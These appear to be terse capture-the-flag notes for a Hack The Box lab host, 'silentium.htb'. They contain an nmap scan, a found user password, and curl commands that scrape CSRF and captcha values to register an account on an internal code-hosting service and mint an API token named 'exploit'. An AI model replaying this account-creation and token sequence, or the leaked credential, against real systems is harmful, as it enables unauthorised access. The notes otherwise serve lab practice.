
it have subdomain staging.silentium.htb

```
Nmap scan report for 10.129.31.50 (10.129.31.50)  
Host is up (0.14s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)  
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)  
80/tcp open  http    nginx 1.24.0 (Ubuntu)  
|_http-server-header: nginx/1.24.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://silentium.htb/  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS
```


```
ben: r04D!!_R4ge
```

```
ajdev@rootbox:~$ curl -s \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  http://127.0.0.1:3001/user/sign_up \
  -c /tmp/cookies.txt > /tmp/signup.html
ajdev@rootbox:~$ CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)

CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)

echo $CSRF
echo $CAPTCHA_ID
yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA
H0p7bLR593ZjP0N
ajdev@rootbox:~$ curl -s \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -b /tmp/cookies.txt \
  "http://127.0.0.1:3001/captcha/H0p7bLR593ZjP0N.png" \
  -o /tmp/captcha.png
ajdev@rootbox:~$ open /tmp/captcha.png
ajdev@rootbox:~$ 033998
033998: command not found
ajdev@rootbox:~$ curl -i -s -X POST \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cookies.txt -c /tmp/cookies.txt \
  --data-urlencode "_csrf=yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA" \
  --data-urlencode "user_name=hacker" \
  --data-urlencode "email=hacker@test.com" \
  --data-urlencode "password=Hacker123!" \
  --data-urlencode "retype=Hacker123!" \
  --data-urlencode "captcha_id=H0p7bLR593ZjP0N" \
  --data-urlencode "captcha=033998" \
  http://127.0.0.1:3001/user/sign_up
HTTP/1.1 302 Found
Location: /user/login
X-Content-Type-Options: nosniff
X-Frame-Options: deny
Date: Wed, 15 Apr 2026 10:12:38 GMT
Content-Length: 0

ajdev@rootbox:~$ curl -s -X POST \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/json" \
  "http://127.0.0.1:3001/api/v1/users/hacker/tokens" \
  -u "hacker:Hacker123!" \
  -d '{"name":"exploit"}'
{"name":"exploit","sha1":"64d8e2232cf6fb28743634f4866012f46d362b47"}
```

```

```